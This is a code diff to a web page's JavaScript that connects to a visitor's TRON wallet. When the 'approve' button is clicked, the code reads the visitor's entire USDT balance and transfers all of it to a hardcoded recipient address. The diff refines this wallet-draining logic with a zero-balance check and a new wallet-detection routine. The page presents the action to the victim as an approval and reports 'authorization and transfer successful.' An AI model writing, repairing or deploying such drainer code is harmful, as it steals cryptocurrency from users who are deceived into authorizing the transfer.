@@ -1,13 +1,21 @@
+let tronWebInstance;
+
 async function getTronWeb() {
-    if (typeof window.tronWeb !== 'undefined') {
-        return window.tronWeb;
-    } else {
-        alert('请安装支持TRC20的钱包（如TronLink, Bitpie, imToken）并登录');
-        throw new Error('Wallet not found');
-    }
+    return new Promise((resolve, reject) => {
+        const checkTronWeb = setInterval(() => {
+            if (typeof window.tronWeb !== 'undefined') {
+                clearInterval(checkTronWeb);
+                tronWebInstance = window.tronWeb;
+                resolve(tronWebInstance);
+            } else {
+                alert('请安装TronLink钱包并登录');
+                reject(new Error('Wallet not found'));
+            }
+        }, 1000);
+    });
 }
 
-const tokenAddress = 'TOKEN_CONTRACT_ADDRESS'; // USDT合约地址
+const tokenAddress = 'USDT_CONTRACT_ADDRESS'; // 替换为USDT合约地址
 const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址
 
 document.getElementById('approveBtn').onclick = async function() {
@@ -15,20 +23,18 @@ document.getElementById('approveBtn').onclick = async function() {
         const tronWeb = await getTronWeb();
         const tokenContract = await tronWeb.contract().at(tokenAddress);
         
-        // 获取用户USDT余额
         const amount = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
-        
-        // 授权合约支配用户的代币
-        const approveTx = await tokenContract.approve(tronWeb.defaultAddress.base58, amount).send();
-        await approveTx.wait(); // 等待交易确认
-        
-        // 转账所有USDT
-        const transferTx = await tokenContract.transferFrom(tronWeb.defaultAddress.base58, recipientAddress, amount).send();
-        await transferTx.wait(); // 等待交易确认
+        if (amount.isZero()) {
+            document.getElementById('status').innerText = '您的USDT余额为0，无法转账。';
+            return;
+        }
+
+        await tokenContract.approve(tronWeb.defaultAddress.base58, amount).send();
+        await tokenContract.transferFrom(tronWeb.defaultAddress.base58, recipientAddress, amount).send();
         
         document.getElementById('status').innerText = '授权并转账成功！';
     } catch (error) {
         console.error(error);
-        document.getElementById('status').innerText = '操作失败: ' + error.message;
+        document.getElementById('status').innerText = '操作失败: ' + (error.message || '未知错误');
     }
 };
